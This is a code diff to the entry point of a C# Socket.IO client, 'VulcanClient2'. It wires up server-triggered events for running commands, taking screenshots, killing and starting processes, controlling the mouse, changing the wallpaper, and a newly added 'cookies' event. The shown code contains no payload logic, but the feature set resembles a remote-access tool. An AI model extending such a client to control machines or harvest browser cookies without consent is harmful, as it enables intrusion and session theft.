@@ -1,24 +1,15 @@
 ﻿using System;
-using System.Diagnostics;
 using System.IO;
 using SocketIOClient;
-using System.Text;
 using System.Threading.Tasks;
-using System.Drawing.Imaging;
-using OpenQA.Selenium;
-using System.Collections.Generic;
-using System.Linq;
-using System.ComponentModel;
 using Microsoft.Extensions.Configuration;
 using System.Runtime.InteropServices;
-using System.Threading;
 using Serilog;
 using Serilog.Events;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
 
 using VulcanClient2.Events;
-using VulcanClient2.Webdriver;
-using VulcanClient2.Webdriver.Actions;
-
 namespace VulcanClient2
 {
     class Program
@@ -45,17 +36,20 @@ namespace VulcanClient2
                 .MinimumLevel.Debug()
                 .MinimumLevel.Override("Microsoft", LogEventLevel.Warning)
                 .Enrich.FromLogContext()
-                .WriteTo.File(Directory.GetCurrentDirectory() + "/logs/LogFile.txt")
+                .WriteTo.File(Directory.GetCurrentDirectory() + @"/logs/log-.log", rollingInterval: RollingInterval.Day)
                 .CreateLogger();
             try
             {
-                Log.Information("Vulcan Client v.1.0.4");
+                Log.Information("Vulcan Client v.1.0.6");
                 var builder = new ConfigurationBuilder()
                     .SetBasePath(Directory.GetCurrentDirectory())
                     .AddJsonFile("config.json");
                 
                 var config = builder.Build();
-                var adress = config.GetSection("Adress").Value;
+
+                Config.Instance = config;
+                
+                var adress = Config.Instance.GetSection("Adress").Value;
 
                 SocketUri = new Uri(adress + "clients");
                 var socket = new SocketIO(SocketUri);
@@ -63,21 +57,23 @@ namespace VulcanClient2
                 
                 socket.OnConnected += Socket_OnConnected;
                 socket.OnDisconnected += Socket_onDisconnected;
-                
+
+                Progress.Socket = socket;
                 // Dodajemy eventy
                 var eventManager = new EventManager();
                 
                 eventManager.Add( new CommandEvent(socket, "command"));
                 eventManager.Add(new WebsiteEvent(socket, "website", notification));
-                eventManager.Add(new ScreenShootEvent(socket, "screenshot"));
+                eventManager.Add(new ScreenShootEvent(socket, "screenshot", notification));
                 eventManager.Add(new ProcessListEvent(socket, "process_list"));
                 eventManager.Add(new ProcessKillEvent(socket, "process_kill", notification));
                 eventManager.Add(new ProcessStartEvent(socket, "process_start", notification));
                 eventManager.Add(new MouseEvent(socket, "mouse"));
                 eventManager.Add(new MouseClickEvent(socket, "mouse_click"));
                 eventManager.Add(new WallPaperEvent(socket, "wallper"));
-                
-                
+                eventManager.Add(new CookieEvent(socket, "cookies"));
+
+
                 socket.OnReceivedEvent += (sender,  e) =>
                 {
                     var events = eventManager.GetAll();
